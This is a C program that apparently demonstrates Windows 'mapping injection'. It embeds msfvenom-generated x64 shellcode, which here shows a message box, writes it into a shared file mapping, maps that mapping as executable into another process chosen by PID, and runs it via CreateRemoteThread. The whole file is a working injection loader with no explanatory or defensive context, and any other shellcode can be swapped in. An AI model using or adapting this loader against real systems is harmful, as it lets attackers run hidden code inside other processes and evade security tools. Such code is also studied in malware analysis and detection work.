#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment (lib, "OneCore.lib")

/*
msfvenom -p windows/x64/messagebox -a x64 EXITFUNC=thread TEXT='Mapping Injection!' --format c
Payload size: 325 bytes
Final size of c file: 1390 bytes
*/
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
"\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x4d\x61\x70\x70\x69"
"\x6e\x67\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x21\x00\x4d"
"\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";

int main(int argc, char** argv)
{
	int targetProcess;
	if (argc < 2) {
		printf("First argument must be PID of the target process");
		return -1;
	}
	else {
		targetProcess = atoi(argv[1]);
		printf("\nUsing PID %d\n", targetProcess);
	}
	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, (DWORD)targetProcess);
	if (hProc == NULL)
	{
		printf("\nCannot open process with PID %d\n", targetProcess);
		return -1;
	}
	HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);
	if (hFileMap == NULL)
	{
		printf("\nCreateFileMapping failed with error: %d\n", GetLastError());
		return -1;
	}
	printf("\nCreated global file mapping object\n");
	LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));
	if (lpMapAddress == NULL)
	{
		printf("\nMapViewOfFile failed with error: %d\n", GetLastError());
		return -1;
	}
	memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));
	printf("\nWritten %d bytes to the global mapping object\n", (DWORD)sizeof(shellcode));
	LPVOID lpMapAddressRemote = MapViewOfFile2(hFileMap, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
	if (lpMapAddressRemote == NULL)
	{
		printf("\nMapViewOfFile2 failed with error: %d\n", GetLastError());
		return -1;
	}
	printf("\nInjected global object mapping to the remote process with pid %d\n", targetProcess);
	HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, lpMapAddressRemote, NULL, 0, NULL);
	if (hRemoteThread == NULL)
	{
		printf("\nCreateRemoteThread failed with error: %d\n", GetLastError());
		return -1;
	}
	printf("\nRemote Thread Started!\n");
	UnmapViewOfFile(lpMapAddress);
	CloseHandle(hFileMap);
	return 0;
}